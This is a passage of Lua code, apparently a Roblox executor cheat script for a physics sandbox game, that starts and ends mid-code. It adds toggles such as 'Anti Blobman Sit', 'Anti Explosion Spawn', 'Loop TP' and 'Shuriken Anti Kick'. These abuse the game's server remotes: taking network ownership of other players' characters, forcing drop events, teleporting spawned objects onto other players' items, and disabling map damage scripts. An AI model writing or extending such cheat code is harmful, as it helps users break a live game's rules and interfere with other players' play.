                local hrp = LocalPlayer.Character:FindFirstChild('HumanoidRootPart')
                local truePosPart = LocalPlayer.Character:FindFirstChild('TruePositionPart')

                if hrp and truePosPart then
                    local rootAttachment = hrp:FindFirstChild('RootAttachment')

                    if rootAttachment and rootAttachment.Parent == hrp then
                        rootAttachment.Parent = truePosPart
                    end

                    for _, part in pairs(LocalPlayer.Character:GetChildren())do
                        if part:IsA('Part') and part.Massless then
                            part.Massless = false

                            function kickFromBlob()
                                for _, plot in pairs(Workspace.PlotItems:GetChildren())do
                                    if plot.Name ~= 'PlayersInPlots' then
                                        for _, item in pairs(plot:GetChildren())do
                                            if item.Name == 'CreatureBlobman' then
                                                local blobScript = item:FindFirstChild('BlobmanSeatAndOwnerScript')
                                                local rightDetector = item:FindFirstChild('RightDetector')
                                                local leftDetector = item:FindFirstChild('LeftDetector')

                                                if blobScript and rightDetector and leftDetector then
                                                    local dropEvent = blobScript:FindFirstChild('CreatureDrop')
                                                    local rightWeld = rightDetector:FindFirstChild('RightWeld')
                                                    local leftWeld = leftDetector:FindFirstChild('LeftWeld')

                                                    if dropEvent and rightWeld and hrp then
                                                        dropEvent:FireServer(rightWeld, hrp)
                                                    end
                                                    if dropEvent and leftWeld and hrp then
                                                        dropEvent:FireServer(leftWeld, hrp)
                                                    end

                                                    local struggleEvent = rs.CharacterEvents and rs.CharacterEvents:FindFirstChild('Struggle')

                                                    if struggleEvent then
                                                        struggleEvent:FireServer(LocalPlayer)
                                                    end
                                                end
                                            end
                                        end
                                    end
                                end
                                for _, plr in pairs(Players:GetPlayers())do
                                    local toyFolder = Workspace:FindFirstChild(plr.Name .. 'SpawnedInToys')

                                    if toyFolder then
                                        for _, item in pairs(toyFolder:GetChildren())do
                                            if item.Name == 'CreatureBlobman' then
                                                local blobScript = item:FindFirstChild('BlobmanSeatAndOwnerScript')
                                                local rightDetector = item:FindFirstChild('RightDetector')
                                                local leftDetector = item:FindFirstChild('LeftDetector')

                                                if blobScript and rightDetector and leftDetector then
                                                    local dropEvent = blobScript:FindFirstChild('CreatureDrop')
                                                    local rightWeld = rightDetector:FindFirstChild('RightWeld')
                                                    local leftWeld = leftDetector:FindFirstChild('LeftWeld')

                                                    if dropEvent and rightWeld and hrp then
                                                        dropEvent:FireServer(rightWeld, hrp)
                                                    end
                                                    if dropEvent and leftWeld and hrp then
                                                        dropEvent:FireServer(leftWeld, hrp)
                                                    end

                                                    local struggleEvent = rs.CharacterEvents and rs.CharacterEvents:FindFirstChild('Struggle')

                                                    if struggleEvent then
                                                        struggleEvent:FireServer(LocalPlayer)
                                                    end
                                                end
                                            end
                                        end
                                    end
                                end
                            end

                            kickFromBlob()
                        end
                    end
                end
            end
        end

        if not antiblob and LocalPlayer.Character then
            local hrp = LocalPlayer.Character:FindFirstChild('HumanoidRootPart')
            local truePosPart = LocalPlayer.Character:FindFirstChild('TruePositionPart')

            if hrp and truePosPart then
                local rootAttachment = truePosPart:FindFirstChild('RootAttachment')

                if rootAttachment then
                    rootAttachment.Parent = hrp
                end

                truePosPart:Destroy()
            end
        end
    end)
end)
DefCore:AddCheckbox('AntiBlobmanAuraGrab', {
    Text = 'Anti Blobman Sit',
    Tooltip = 'Stops nearby Blobman seat grabs.',
    Default = false,
    Callback = function(enabled)
        antiBlobmanGrabEnabled = enabled

        while antiBlobmanGrabEnabled do
            for _, player in pairs(Players:GetPlayers())do
                if player and getCharacter(player) then
                    local pc = getCharacter(player)
                    local prp = pc and getHumanoidRootPart(pc)
                    local phum = pc and getHumanoid(pc)
                    local mc = getCharacter(LocalPlayer)
                    local mrp = mc and getHumanoidRootPart(mc)

                    if player.Name ~= LocalPlayer.Name and prp and mrp and phum and phum.SeatPart and phum.SeatPart.Parent and phum.SeatPart.Parent.Name == 'CreatureBlobman' and getDistance(prp, mrp) <= 19 then
                        SetNetworkOwnerRemote:FireServer(prp, prp.CFrame)
                        task.wait(0.01)
                    end
                end
            end

            task.wait(0.01)
        end
    end,
})
DefCore:AddCheckbox('AntiBurn', {
    Text = 'Anti Burn',
    Tooltip = 'Stops you from being burnt by a fire',
    Default = false,
}):OnChanged(function(v)
    if v then
        cons.antiburn1 = LocalPlayer.CharacterAdded:Connect(function(ch)
            if cons.antiburn then
                cons.antiburn:Disconnect()
            end

            cons.antiburn = ch:WaitForChild('Humanoid', 0.5).FireDebounce.Changed:Connect(function()
                if ch:WaitForChild('Humanoid', 0.5).FireDebounce.Value == true then
                    local bar = Workspace.Plots.Plot1.Barrier.PlotBarrier
                    local pos = bar.CFrame

                    task.spawn(function()
                        repeat
                            task.wait()

                            bar.CFrame = HRP.CFrame
                        until not hum.FireDebounce.Value
                    end)
                    task.wait(1)

                    ch:WaitForChild('Humanoid', 0.5).FireDebounce.Value = false

                    task.wait()

                    bar.CFrame = pos
                end
            end)
        end)
        cons.antiburn = LocalPlayer.Character.Humanoid.FireDebounce.Changed:Connect(function()
            if LocalPlayer.Character.Humanoid.FireDebounce.Value == true then
                local bar = Workspace.Plots.Plot1.Barrier.PlotBarrier
                local pos = bar.CFrame

                task.spawn(function()
                    repeat
                        task.wait()

                        bar.CFrame = HRP.CFrame
                    until not hum.FireDebounce.Value
                end)
                task.wait(1)

                LocalPlayer.Character.Humanoid.FireDebounce.Value = false

                task.wait()

                bar.CFrame = pos
            end
        end)
    else
        if cons.antiburn then
            cons.antiburn:Disconnect()
        end
        if cons.antiburn1 then
            cons.antiburn1:Disconnect()
        end
    end
end)

explosionConnection = nil

function startExplosionProtection()
    if explosionConnection then
        return
    end

    explosionConnection = workspace.ChildAdded:Connect(function(c)
        if not gucciActive then
            return
        end
        if c.Name == 'Part' or c.Name == 'Explosion' or c:IsA('Explosion') then
            local pos = c:IsA('BasePart') and c.Position or (c:FindFirstChildWhichIsA('BasePart') and c:FindFirstChildWhichIsA('BasePart').Position)

            if pos and HRP and (pos - HRP.Position).Magnitude < 50 then
                HRP.Anchored = true

                task.wait(0.05)

                HRP.Anchored = false

                if stvel then
                    stvel(HRP)
                end
                if hum then
                    hum:ChangeState(Enum.HumanoidStateType.Running)
                end
            end
        end
    end)
end
function stopExplosionProtection()
    if explosionConnection then
        pcall(function()
            explosionConnection:Disconnect()
        end)

        explosionConnection = nil
    end
end

DefCore:AddCheckbox('ExplosionProtection', {
    Text = 'Anti Explosion',
    Tooltip = 'Cant be moved when exploded',
    Default = false,
})
Toggles.ExplosionProtection:OnChanged(function(state)
    gucciActive = state

    if state then
        startExplosionProtection()
        Library:Notify({
            Title = '<b>UNSTABLE</b>',
            Description = 'Anti explosion enabled.',
            Time = 1,
        })
    else
        stopExplosionProtection()
        Library:Notify({
            Title = '<b>UNSTABLE</b>',
            Description = 'Anti explosion disabled.',
            Time = 1,
        })
    end
end)
DefCore:AddCheckbox('LoopRagdoll', {
    Text = 'Anti Snowball',
    Default = false,
})
Toggles.LoopRagdoll:OnChanged(function(Value)
    SetToggleState('LoopRagdoll', Value)

    loopRagdoll = Value

    if Value then
        task.spawn(function()
            while loopRagdoll and task.wait(0.05) do
                pcall(function()
                    local char = Player.Character
                    local hrp = char and char:FindFirstChild('HumanoidRootPart')

                    if hrp then
                        ReplicatedStorage.CharacterEvents.RagdollRemote:FireServer(hrp, 0.5)
                    end
                end)
            end
        end)
    end
end)
DefCore:AddCheckbox('AntiBombToggle', {
    Text = 'Anti Explosion Spawn',
    Tooltip = 'Uses oven to explode any explodables spawned',
    Default = false,
})
Toggles.AntiBombToggle:OnChanged(function(state)
    if state then
        if getgenv().AntiBombRunning then
            return
        end

        getgenv().AntiBombRunning = true
        Players = game:GetService('Players')
        ReplicatedStorage = game:GetService('ReplicatedStorage')
        Workspace = game:GetService('Workspace')
        LocalPlayer = Players.LocalPlayer
        SetupCoordinate = Vector3.new(484, 134, 207)

        local TargetBombNames = {
            BombMissile = true,
            BombDarkMatter = true,
            BombBalloon = true,
            BallSnowball = true,
            BalloonModel = true,
        }
        local ButtonSequence = {
            'ButtonOven',
        }
        local spawnRemote = ReplicatedStorage:WaitForChild('MenuToys'):WaitForChild('SpawnToyRemoteFunction')
        local interactRemote = ReplicatedStorage:WaitForChild('GrabEvents'):WaitForChild('SetNetworkOwner')

        function SpawnOvenAndAcquire()
            local Character = LocalPlayer.Character
            local Humanoid = Character and Character:FindFirstChild('Humanoid')
            local HumanoidRootPart = Character and Character:FindFirstChild('HumanoidRootPart')

            if not Character or not Humanoid or Humanoid.Health <= 0 or not HumanoidRootPart then
                return nil
            end

            local OriginalCFrame = HumanoidRootPart.CFrame
            local myToyFolderName = LocalPlayer.Name .. 'SpawnedInToys'
            local myToyFolder = Workspace:FindFirstChild(myToyFolderName)

            if myToyFolder then
                local existingOven = myToyFolder:FindFirstChild('OvenDarkGray')

                if existingOven then
                    existingOven:Destroy()
                    task.wait(0.1)
                end
            end
            if HumanoidRootPart and Humanoid.Health > 0 then
                HumanoidRootPart.CFrame = CFrame.new(SetupCoordinate)
            else
                return nil
            end

            local spawnPos = HumanoidRootPart.CFrame * CFrame.new(0, 1, 5)

            task.spawn(function()
                spawnRemote:InvokeServer('OvenDarkGray', spawnPos, Vector3.new(0, 0, 0))
            end)

            myToyFolder = Workspace:WaitForChild(myToyFolderName, 5)

            if not myToyFolder then
                return nil
            end

            local myOven = myToyFolder:WaitForChild('OvenDarkGray', 5)

            if not myOven then
                return nil
            end

            local ovenMain = myOven:WaitForChild('Main', 3)

            task.wait(0.12)

            if HumanoidRootPart and ovenMain and Humanoid.Health > 0 then
                HumanoidRootPart.CFrame = ovenMain.CFrame * CFrame.new(0, 0, 5)
            end

            local soundPart = myOven:WaitForChild('SoundPart', 3)

            if soundPart then
                interactRemote:FireServer(soundPart, soundPart.CFrame)
            end

            for _, btnName in ipairs(ButtonSequence)do
                local btn = myOven:FindFirstChild(btnName) or myOven:WaitForChild(btnName, 1)

                if btn then
                    interactRemote:FireServer(btn, btn.CFrame)
                end
            end

            if HumanoidRootPart and Humanoid.Health > 0 then
                HumanoidRootPart.CFrame = OriginalCFrame
            end

            local partOwnerFound = false
            local searchStart = tick()

            while tick() - searchStart < 0.5 do
                function SearchForPartOwner(parent)
                    for _, child in pairs(parent:GetChildren())do
                        if child.Name == 'PartOwner' then
                            return true
                        end
                        if SearchForPartOwner(child) then
                            return true
                        end
                    end

                    return false
                end

                if SearchForPartOwner(myOven) then
                    partOwnerFound = true

                    break
                end

                task.wait(0.05)
            end

            if partOwnerFound then
                return myOven
            else
                task.wait(0.3)

                return nil
            end
        end

        local myToyFolderName = LocalPlayer.Name .. 'SpawnedInToys'
        local ReturnYCoordinate = 70000

        task.spawn(function()
            local myOven = nil
            local ovenMain = nil

            while getgenv().AntiBombRunning do
                local Character = LocalPlayer.Character
                local Humanoid = Character and Character:FindFirstChild('Humanoid')

                if not Character or not Humanoid or Humanoid.Health <= 0 then
                    task.wait(1)

                    continue
                end
                if not myOven or not myOven.Parent then
                    myOven = nil
                    ovenMain = nil

                    local retryCount = 0

                    while getgenv().AntiBombRunning and retryCount < 5 do
                        local currentCharacter = LocalPlayer.Character
                        local currentHumanoid = currentCharacter and currentCharacter:FindFirstChild('Humanoid')

                        if not currentCharacter or not currentHumanoid or currentHumanoid.Health <= 0 then
                            break
                        end

                        myOven = SpawnOvenAndAcquire()

                        if myOven then
                            ovenMain = myOven:WaitForChild('Main', 3)

                            if ovenMain then
                                break
                            end
                        end

                        retryCount = retryCount + 1

                        task.wait(0.1)
                    end

                    if not getgenv().AntiBombRunning then
                        break
                    end
                    if (not myOven or not ovenMain) and retryCount >= 5 then
                        getgenv().AntiBombRunning = false

                        Toggles.AntiBombToggle:SetValue(false)

                        break
                    end
                end
                if not getgenv().AntiBombRunning then
                    break
                end

                local foundTarget = nil
                local targetCFrame = nil

                for _, folder in pairs(Workspace:GetChildren())do
                    if string.sub(folder.Name, -13) == 'SpawnedInToys' then
                        if folder.Name == myToyFolderName then
                            continue
                        end

                        for _, toy in pairs(folder:GetChildren())do
                            if TargetBombNames[toy.Name] then
                                foundTarget = toy

                                break
                            end
                        end
                    end
                    if foundTarget then
                        break
                    end
                end

                if not foundTarget then
                    local balloonsFolder = Workspace:FindFirstChild('Balloons')

                    if balloonsFolder then
                        for _, toy in pairs(balloonsFolder:GetChildren())do
                            if TargetBombNames[toy.Name] then
                                foundTarget = toy

                                break
                            end
                        end
                    end
                end
                if foundTarget and foundTarget.Parent and foundTarget.Parent.Name == myToyFolderName then
                    foundTarget = nil
                end
                if foundTarget then
                    if foundTarget.Name == 'BombBalloon' or foundTarget.Name == 'BalloonModel' then
                        targetCFrame = foundTarget:GetPivot()
                    elseif foundTarget:FindFirstChild('Main') then
                        targetCFrame = foundTarget.Main.CFrame
                    end
                    if targetCFrame then
                        for i = 1, 15 do
                            if not foundTarget or not foundTarget.Parent then
                                break
                            end
                            if not myOven or not myOven.Parent or not ovenMain or not ovenMain.Parent then
                                break
                            end
                            if foundTarget.Name == 'BombBalloon' or foundTarget.Name == 'BalloonModel' then
                                targetCFrame = foundTarget:GetPivot()
                            elseif foundTarget:FindFirstChild('Main') then
                                targetCFrame = foundTarget.Main.CFrame
                            end
                            if not targetCFrame then
                                break
                            end

                            local targetPos = targetCFrame.Position
                            local returnPos = Vector3.new(targetPos.X, ReturnYCoordinate, targetPos.Z)

                            ovenMain.CFrame = CFrame.new(targetPos)
                            ovenMain.Velocity = Vector3.zero
                            ovenMain.RotVelocity = Vector3.zero

                            task.wait()

                            ovenMain.CFrame = CFrame.new(returnPos)
                            ovenMain.Velocity = Vector3.zero
                            ovenMain.RotVelocity = Vector3.zero

                            task.wait()
                        end
                    else
                        task.wait()
                    end
                else
                    if ovenMain and ovenMain.Parent then
                        local fastTick = tick() * 30
                        local idleX = math.sin(fastTick) * 150
                        local idleZ = math.cos(fastTick) * 150

                        ovenMain.CFrame = CFrame.new(idleX, ReturnYCoordinate, idleZ)
                        ovenMain.Velocity = Vector3.zero
                        ovenMain.RotVelocity = Vector3.zero
                    end

                    task.wait()
                end
            end

            getgenv().AntiBombRunning = false
        end)
    else
        getgenv().AntiBombRunning = false
    end
end)
DefCore:AddCheckbox('AntiPaint', {
    Text = 'Anti Paint',
    Default = false,
    Tooltip = 'Deletes all existing paint parts and destroys new ones',
    Callback = function(v)
        if v then
            antipcon = Workspace.DescendantAdded:Connect(function(d)
                if d.Name == 'PaintPlayerPart' then
                    task.wait(0.1)
                    d:Destroy()
                end
            end)

            for _, v2 in pairs(Workspace:GetDescendants())do
                if v2.Name == 'PainPlayerPart' then
                    v2:Destroy()
                end
            end
        else
            if antipcon then
                antipcon:Disconnect()
            end
        end
    end,
})

local antiPoison = false

DefCore:AddCheckbox('AntiPoison', {
    Text = 'Anti Poison',
    Tooltip = 'Disables poison damage parts and scripts.',
    Default = false,
}):OnChanged(function(v)
    antiPoison = v

    local poisonFolders = {
        workspace.Map.Hole.PoisonBigHole,
        workspace.Map.Hole.PoisonSmallHole,
    }

    for _, folder in pairs(poisonFolders)do
        if not folder then
            continue
        end

        for _, obj in pairs(folder:GetDescendants())do
            if obj:IsA('Script') or obj:IsA('LocalScript') then
                obj.Disabled = v
            end
            if obj:IsA('BasePart') then
                if v then
                    obj.CanTouch = false
                    obj.CanCollide = false
                else
                    obj.CanTouch = true
                    obj.CanCollide = true
                end
            end
        end
    end
end)
DefCore:AddCheckbox('AntiKill', {
    Text = 'Anti Loop Kill',
    Tooltip = 'Prevents spawn camping by teleporting you to safety.',
    Default = false,
}):OnChanged(function(v)
    if v then
        cons.antiloopkill = LocalPlayer.CharacterAdded:Connect(function(c)
            local hrp2 = c:WaitForChild('HumanoidRootPart')

            hrp2.CFrame = CFrame.new(524.703, 93.712, -375.04)
        end)
    else
        if cons.antiloopkill then
            cons.antiloopkill:Disconnect()
        end
    end
end)
DefCore:AddCheckbox('AutoResetLoop', {
    Text = 'Loop Reset',
    Tooltip = 'Keeps resetting your character repeatedly.',
    Default = false,
}):OnChanged(function(enabled)
    autoResetEnabled = enabled

    if not enabled then
        return
    end

    task.spawn(function()
        while autoResetEnabled do
            local ch = LocalPlayer.Character
            local hum = ch and ch:FindFirstChild('Humanoid')

            if hum and hum.Health > 0 then
                hum.Health = 0
            end

            task.wait(0.5)
        end
    end)
end)
DefMove:AddDropdown('LoopTpStyle', {
    Text = 'TP Style',
    Tooltip = 'Changes how Loop TP moves you.',
    Values = TeleportStyles,
    Default = currentStyle,
    Multi = false,
    Callback = function(v)
        currentStyle = v
    end,
})
DefMove:AddDropdown('LoopTpArea', {
    Text = 'TP Area',
    Tooltip = 'Sets the teleport location.',
    Values = {
        'Spawn',
        'Barn',
        'Void',
        'Heaven',
        'Sky',
        'Underground',
    },
    Default = currentAreaName,
    Multi = false,
    Callback = function(v)
        currentAreaName = v
    end,
})
DefMove:AddSlider('LoopTpRadius', {
    Text = 'Radius',
    Tooltip = 'How far you can drift from the center.',
    Default = 100,
    Min = 10,
    Max = 2000,
    Rounding = 0,
    Callback = function(v)
        radius = v
    end,
})
DefMove:AddSlider('LoopTpHeight', {
    Text = 'Height Offset',
    Tooltip = 'Vertical position offset.',
    Default = 0,
    Min = -200,
    Max = 500,
    Rounding = 0,
    Callback = function(v)
        height = v
    end,
})
DefMove:AddCheckbox('LoopTp', {
    Text = 'Loop TP',
    Tooltip = 'Repositions you continuously.',
    Default = false,
    Callback = function(v)
        looptp = v

        if v then
            loopStartPos = HRP.CFrame

            local areaPos = TeleportAreas[currentAreaName]

            task.spawn(function()
                while looptp do
                    local t = tick()
                    local offset = Vector3.new()

                    if currentStyle == 'Desync Random' then
                        offset = Vector3.new(math.random(-radius, radius), height, math.random(-radius, radius))
                    elseif currentStyle == 'Anti Grab' then
                        offset = Vector3.new(math.random(-radius, radius), math.random(20, 60), math.random(-radius, radius))
                    elseif currentStyle == 'Behind Target' then
                        local plrs = Players:GetPlayers()
                        local target = plrs[math.random(1, #plrs)]

                        if target and target.Character and target.Character:FindFirstChild('HumanoidRootPart') then
                            HRP.CFrame = target.Character.HumanoidRootPart.CFrame * CFrame.new(0, 0, -5)
                        end
                    elseif currentStyle == 'Spin Desync' then
                        offset = Vector3.new(math.cos(t * speed * 10) * radius, height, math.sin(t * speed * 10) * radius)
                    elseif currentStyle == 'Jitter' then
                        offset = Vector3.new(math.random(-50, 50), math.random(-10, 10), math.random(-50, 50))
                    elseif currentStyle == 'Far Warp' then
                        offset = Vector3.new(math.random(-2E3, 2000), height, math.random(-2E3, 2000))
                    elseif currentStyle == 'Micro Blink' then
                        offset = Vector3.new(math.random(-10, 10), 0, math.random(-10, 10))
                    end
                    if currentStyle ~= 'Behind Target' then
                        HRP.CFrame = areaPos + offset
                    end

                    stvel(HRP)
                    task.wait(0.01 / speed)
                end
            end)
        else
            looptp = false

            stvel(HRP)

            if loopStartPos then
                HRP.CFrame = loopStartPos
                loopStartPos = nil
            end
        end
    end,
})

TweenService = game:GetService('TweenService')
CoreGui = game:GetService('CoreGui')
Players = game:GetService('Players')
rs = game:GetService('ReplicatedStorage')

function Notify(eventKey, customBody)
    return
end

_G.ShurikenESP_OutlineColor = _G.ShurikenESP_OutlineColor or Color3.fromRGB(255, 255, 255)
_G.ShurikenESP_FillColor = _G.ShurikenESP_FillColor or Color3.fromRGB(255, 255, 255)
destroyremGlobal = nil

function GlobalClearKunai()
    local inv = workspace:FindFirstChild(LocalPlayer.Name .. 'SpawnedInToys')

    if inv and destroyremGlobal then
        for _, v in pairs(inv:GetChildren())do
            if v.Name == 'AntiKick' or v.Name == 'NinjaShuriken' then
                pcall(function()
                    destroyremGlobal:FireServer(v)
                end)
            end
        end
    end
end
function RunAntiKick()
    ReplicatedStorage = game:GetService('ReplicatedStorage')
    setOwner = ReplicatedStorage:WaitForChild('GrabEvents'):WaitForChild('SetNetworkOwner')
    stickyEvent = ReplicatedStorage:WaitForChild('PlayerEvents'):WaitForChild('StickyPartEvent')
    spawnRemote = ReplicatedStorage.MenuToys.SpawnToyRemoteFunction
    destroyrem = ReplicatedStorage:WaitForChild('MenuToys'):WaitForChild('DestroyToy')
    canSpawn = LocalPlayer:WaitForChild('CanSpawnToy')
    destroyremGlobal = destroyrem

    function getHRP()
        local char = LocalPlayer.Character

        if char then
            local hrp = char:FindFirstChild('HumanoidRootPart')

            if hrp then
                return hrp
            end
        end

        local newChar = LocalPlayer.CharacterAdded:Wait()

        return newChar:WaitForChild('HumanoidRootPart', 10)
    end
    function ClearKunai()
        GlobalClearKunai()
    end
    function CheckForHome()
        if not workspace.PlotItems.PlayersInPlots:FindFirstChild(LocalPlayer.Name) then
            return false
        end

        for _, v in pairs(workspace.Plots:GetChildren())do
            local sign = v:FindFirstChild('PlotSign')
            local owners = sign and sign:FindFirstChild('ThisPlotsOwners')

            if owners then
                for _, b in pairs(owners:GetChildren())do
                    if b.Value == LocalPlayer.Name then
                        local folder = workspace.PlotItems:FindFirstChild(v.Name)

                        if folder then
                            return true, folder
                        end
                    end
                end
            end
        end

        return false
    end
    function ApplyESP(kunai, good)
        for _, obj in pairs(kunai:GetChildren())do
            if obj:IsA('BasePart') then
                local ex = obj:FindFirstChildWhichIsA('SelectionBox')

                if ex then
                    ex:Destroy()
                end
            end
        end
    end

    local lastNotify = nil

    function notifyOnce(key, body)
        if lastNotify == key then
            return
        end

        lastNotify = key

        Notify(key, body)
    end
    function IsProperlyStuck(kunai)
        if not kunai or not kunai.Parent then
            return false
        end

        local sp = kunai:FindFirstChild('StickyPart')

        if not sp then
            return false
        end

        local weld = sp:FindFirstChild('StickyWeld')

        if not weld or not weld.Part1 then
            return false
        end

        local hrp = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild('HumanoidRootPart')

        if not hrp then
            return false
        end

        local firePart = hrp:FindFirstChild('FirePlayerPart')

        if not firePart then
            return false
        end

        return weld.Part1 == firePart
    end
    function StickKunai(kunai)
        if not kunai or not kunai.Parent then
            return
        end

        local sp = kunai:FindFirstChild('StickyPart')

        if not sp then
            return
        end

        local hrp = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild('HumanoidRootPart')

        if not hrp then
            return
        end

        local firePart = hrp:FindFirstChild('FirePlayerPart')

        if not firePart then
            return
        end

        pcall(function()
            setOwner:FireServer(sp, sp.CFrame)
        end)

        if kunai:FindFirstChild('SoundPart') then
            pcall(function()
                setOwner:FireServer(kunai.SoundPart, kunai.SoundPart.CFrame)
            end)
        end

        task.wait()
        stickyEvent:FireServer(sp, firePart, CFrame.new(0, -0.5, 0) * CFrame.Angles(0, math.rad(90), math.rad(90)))

        for _, obj in pairs(kunai:GetDescendants())do
            if obj:IsA('Highlight') or obj:IsA('SelectionBox') or obj:IsA('BillboardGui') then
                obj:Destroy()
            end
        end
        for _, obj in pairs(kunai:GetChildren())do
            if obj:IsA('BasePart') then
                obj.CanTouch = false
                obj.CanCollide = false
                obj.CanQuery = false
                obj.Transparency = 0.5
                obj.CastShadow = false
            end
        end
    end
    function StickKunaiGuaranteed(kunai)
        for attempt = 1, 8 do
            StickKunai(kunai)
            task.wait(0.4)

            if IsProperlyStuck(kunai) then
                notifyOnce('attached')

                return true
            end

            lastNotify = nil

            notifyOnce('detached', 'Attach attempt ' .. attempt .. '/8 \u{2014} retrying\u{2026}')
        end

        StickKunai(kunai)
        task.wait(0.6)

        if IsProperlyStuck(kunai) then
            notifyOnce('attached')

            return true
        end

        return false
    end
    function SpawnToy(name)
        local t = tick()

        while not canSpawn.Value do
            if not _G.ShurikenAntiKick or tick() - t > 5 then
                return nil
            end

            task.wait(0.1)
        end

        local hrp = getHRP()

        if hrp then
            task.spawn(function()
                pcall(function()
                    spawnRemote:InvokeServer(name, hrp.CFrame * CFrame.new(0, 12, 20), Vector3.new(0, 0, 0))
                end)
            end)
        end

        local boolik, house = CheckForHome()
        local inv = workspace:FindFirstChild(LocalPlayer.Name .. 'SpawnedInToys')

        if boolik and house then
            return house:WaitForChild(name, 2)
        elseif not workspace.PlotItems.PlayersInPlots:FindFirstChild(LocalPlayer.Name) and inv then
            return inv:WaitForChild(name, 2)
        end

        return nil
    end

    while _G.ShurikenAntiKick do
        task.wait(0.005)

        if not LocalPlayer.Character or not LocalPlayer.Character:FindFirstChild('Humanoid') or LocalPlayer.Character.Humanoid.Health <= 0 then
            continue
        end

        local inv = workspace:FindFirstChild(LocalPlayer.Name .. 'SpawnedInToys')
        local kunai = inv and inv:FindFirstChild('NinjaShuriken')

        if workspace.PlotItems.PlayersInPlots:FindFirstChild(LocalPlayer.Name) then
            local boolik, house = CheckForHome()

            if boolik and house and workspace.Plots:FindFirstChild(house.Name) then
                local sign = workspace.Plots[house.Name]:FindFirstChild('PlotSign')

                if sign and sign.ThisPlotsOwners.Value.TimeRemainingNum.Value > 89 then
                    kunai = SpawnToy('NinjaShuriken')

                    if kunai == nil then
                        continue
                    end

                    kunai.Name = 'AntiKick'

                    StickKunaiGuaranteed(kunai)
                end
            end
        end
        if not kunai then
            if workspace.PlotItems.PlayersInPlots:FindFirstChild(LocalPlayer.Name) then
                continue
            end

            kunai = SpawnToy('NinjaShuriken')

            if kunai == nil then
                continue
            end

            kunai.Name = 'AntiKick'

            if not kunai then
                continue
            end
        end

        repeat
            if kunai and kunai:FindFirstChild('StickyPart') then
                local stuck = IsProperlyStuck(kunai)

                if not stuck or kunai.StickyPart.CanTouch == true then
                    StickKunaiGuaranteed(kunai)

                    kunai.Name = 'AntiKick'
                end
            end

            task.wait(0.3)
        until not kunai or not _G.ShurikenAntiKick or not kunai:FindFirstChild('StickyPart') or kunai.StickyPart.CanTouch == false or not LocalPlayer.Character or not LocalPlayer.Character:FindFirstChild('HumanoidRootPart') or (LocalPlayer.Character.HumanoidRootPart.Position - kunai.StickyPart.Position).Magnitude >= 20

        if not kunai or not kunai:FindFirstChild('StickyPart') or not LocalPlayer.Character or not LocalPlayer.Character:FindFirstChild('HumanoidRootPart') or (LocalPlayer.Character.HumanoidRootPart.Position - kunai.StickyPart.Position).Magnitude >= 20 then
            ClearKunai()
        end

        pcall(function()
            repeat
                task.wait(0.05)
            until not _G.ShurikenAntiKick or not LocalPlayer.Character or not LocalPlayer.Character:FindFirstChild('Humanoid') or not kunai or not kunai:FindFirstChild('StickyPart') or not kunai.StickyPart:FindFirstChild('StickyWeld') or not kunai.StickyPart.StickyWeld.Part1 or not IsProperlyStuck(kunai)

            if not kunai or not kunai:FindFirstChild('StickyPart') or (LocalPlayer.Character and LocalPlayer.Character:FindFirstChild('Humanoid') and LocalPlayer.Character.Humanoid.Health <= 0) or not kunai.StickyPart:FindFirstChild('StickyWeld') or not kunai.StickyPart.StickyWeld.Part1 or not IsProperlyStuck(kunai) then
                ClearKunai()
            end
        end)
    end

    ClearKunai()
end

charConn = nil
autoEnConn = nil

function FullShutdown()
    _G.ShurikenAntiKick = false

    if charConn then
        pcall(function()
            charConn:Disconnect()
        end)

        charConn = nil
    end

    GlobalClearKunai()
end
function HookRespawn()
    if charConn then
        pcall(function()
            charConn:Disconnect()
        end)
    end

    charConn = LocalPlayer.CharacterAdded:Connect(function()
        if not _G.ShurikenAntiKick then
            return
        end

        task.wait(1.5)
        task.spawn(RunAntiKick)
    end)
end

ShurikenToggle = DefUtilExtra:AddCheckbox('ShurikenAntiKickToggle', {
    Text = 'Shuriken Anti Kick',
    Tooltip = "Attaches a shuriken to you so you can't be kicked.",
    Default = false,
    Callback = function(Value)
        if Value then
            _G.ShurikenAntiKick = true

            HookRespawn()
            task.spawn(RunAntiKick)
        else
            FullShutdown()
        end
    end,
})
Players = game:GetService('Players')
RS = game:GetService('ReplicatedStorage')
RunService = game:GetService('RunService')
plr = Players.LocalPlayer
AntiKickItemActive = false
MyPCLD = nil
pcldConn = nil
ToyList = {
    Lantern = 'JapaneseLantern',
    WD40 = 'SprayCanWD',
    ['Single Candle'] = 'SpookyCandle1',
}

local DropdownValues = {}

for shortName, _ in pairs(ToyList)do
    table.insert(DropdownValues, shortName)
end

table.sort(DropdownValues)

local SelectedToy = ToyList['Spooky Candle'] or ToyList[DropdownValues[1] ]
local AntiKickItemDropdown = DefUtilExtra:AddDropdown('AntiKickItemDropdown', {
    Values = DropdownValues,
    Default = 'Spooky Candle',
    Multi = false,
    Text = 'What item will be used?',
})

AntiKickItemDropdown:OnChanged(function(Value)
    SelectedToy = ToyList[Value]
end)

function GetMagnitude(Part1, Part2)
    return (Part1.Position - Part2.Position).Magnitude
end
function FWD(parent, part, timeOffset)
    return parent:FindFirstChild(part) or parent:WaitForChild(part, timeOffset or 1)
end
function CFP(parent, part)
    return parent:FindFirstChild(part) ~= nil
end
function CheckNetworkOwnerOnPart(Part)
    local po = Part:FindFirstChild('PartOwner')

    return po and po.Value == plr.Name
end
function sno(part)
    pcall(function()
        local grabEvents = RS:FindFirstChild('GrabEvents')
        local setNetOwner = grabEvents and grabEvents:FindFirstChild('SetNetworkOwner')

        if setNetOwner then
            setNetOwner:FireServer(part, part.CFrame)
        end
    end)
end
function CheckForHome()
    local plotItems = workspace:FindFirstChild('PlotItems')
    local plots = workspace:FindFirstChild('Plots')

    if plots and plotItems then
        for i = 1, 5 do
            local Plot = plots:FindFirstChild('Plot' .. i)

            if Plot then
                local sign = Plot:FindFirstChild('PlotSign')
                local owners = sign and sign:FindFirstChild('ThisPlotsOwners')

                if owners then
                    for _, v in pairs(owners:GetChildren())do
                        if v.Value == plr.Name then
                            return plotItems:FindFirstChild('Plot' .. i)
                        end
                    end
                end
            end
        end
    end

    return nil
end
function SpawnToy(ToyName)
    local InPlot = plr:FindFirstChild('InPlot')
    local InOwnedPlot = plr:FindFirstChild('InOwnedPlot')
    local CanSpawnToy = plr:FindFirstChild('CanSpawnToy')
    local inv = workspace:FindFirstChild(plr.Name .. 'SpawnedInToys')

    if InPlot and InPlot.Value and InOwnedPlot and not InOwnedPlot.Value then
